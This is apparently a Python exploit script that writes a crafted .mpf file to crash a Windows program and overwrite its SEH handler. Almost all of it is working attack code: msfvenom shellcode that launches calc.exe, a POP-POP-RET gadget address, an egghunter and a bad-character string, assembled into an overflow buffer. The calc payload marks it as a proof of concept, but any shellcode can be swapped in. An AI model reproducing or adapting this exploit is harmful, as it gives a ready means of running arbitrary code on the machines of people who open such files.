#!/usr/bin/env python
# -*- coding: utf8 -*-
#Author: Win Sam
#Description : Crash it with 5000 and overwrite SEH handler 
fpath = "winsam.mpf"

#017D16FA   5E               POP ESI
#017D16FB   5B               POP EBX
#017D16FC   C3               RETN


#root@kali:~# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d\x1a' -f c
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 10 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 220 (iteration=0)
#x86/shikata_ga_nai chosen with final size 220
#Payload size: 220 bytes
#Final size of c file: 949 bytes

calculator=("\xba\x4e\x95\x96\xc5\xd9\xd0\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x31\x31\x53\x13\x03\x53\x13\x83\xc3\x4a\x77\x63\x39\xba\xf5"
"\x8c\xc2\x3a\x9a\x05\x27\x0b\x9a\x72\x23\x3b\x2a\xf0\x61\xb7"
"\xc1\x54\x92\x4c\xa7\x70\x95\xe5\x02\xa7\x98\xf6\x3f\x9b\xbb"
"\x74\x42\xc8\x1b\x45\x8d\x1d\x5d\x82\xf0\xec\x0f\x5b\x7e\x42"
"\xa0\xe8\xca\x5f\x4b\xa2\xdb\xe7\xa8\x72\xdd\xc6\x7e\x09\x84"
"\xc8\x81\xde\xbc\x40\x9a\x03\xf8\x1b\x11\xf7\x76\x9a\xf3\xc6"
"\x77\x31\x3a\xe7\x85\x4b\x7a\xcf\x75\x3e\x72\x2c\x0b\x39\x41"
"\x4f\xd7\xcc\x52\xf7\x9c\x77\xbf\x06\x70\xe1\x34\x04\x3d\x65"
"\x12\x08\xc0\xaa\x28\x34\x49\x4d\xff\xbd\x09\x6a\xdb\xe6\xca"
"\x13\x7a\x42\xbc\x2c\x9c\x2d\x61\x89\xd6\xc3\x76\xa0\xb4\x89"
"\x89\x36\xc3\xff\x8a\x48\xcc\xaf\xe2\x79\x47\x20\x74\x86\x82"
"\x05\x8a\xcc\x8f\x2f\x03\x89\x45\x72\x4e\x2a\xb0\xb0\x77\xa9"
"\x31\x48\x8c\xb1\x33\x4d\xc8\x75\xaf\x3f\x41\x10\xcf\xec\x62"
"\x31\xac\x73\xf1\xd9\x1d\x16\x71\x7b\x62")


#="\x00\x0a\x0d\x1a"

badchar=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
"\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

junk = "http://%s" % ("W00TW00T" + calculator + "A"*(4105-8-len(calculator)) + "\xEB\x20\x41\x41"+"\xFA\x16\x7D\x01"+ "A"*26 + egghunter + badchar + "C"*(5000-4109-4-26-len(egghunter)-len(badchar)))

print "[+] Writing exploit file %s" % fpath
with open(fpath, "w") as f:
    f.write(junk)

print "[+] File written\n"
